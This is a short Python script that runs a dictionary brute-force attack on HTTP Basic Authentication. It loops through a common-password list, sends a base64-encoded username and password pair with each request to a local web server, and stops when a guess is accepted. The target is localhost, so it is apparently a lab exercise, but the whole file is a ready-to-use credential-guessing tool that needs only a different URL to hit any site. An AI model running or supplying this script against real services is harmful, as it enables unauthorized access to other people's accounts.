import requests
import base64

username = 'username'
url = 'http://localhost:3000/'

with open('xato-net-10-million-passwords-10000.txt', 'r') as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    credentials = base64.b64encode(f'{username}:{password}'.encode('utf-8')).decode('utf-8')
    response = requests.get(url, headers={'Authorization': f'Basic {credentials}'})

    if response.status_code == 200:
        print(f'Password found: {password}')
        break
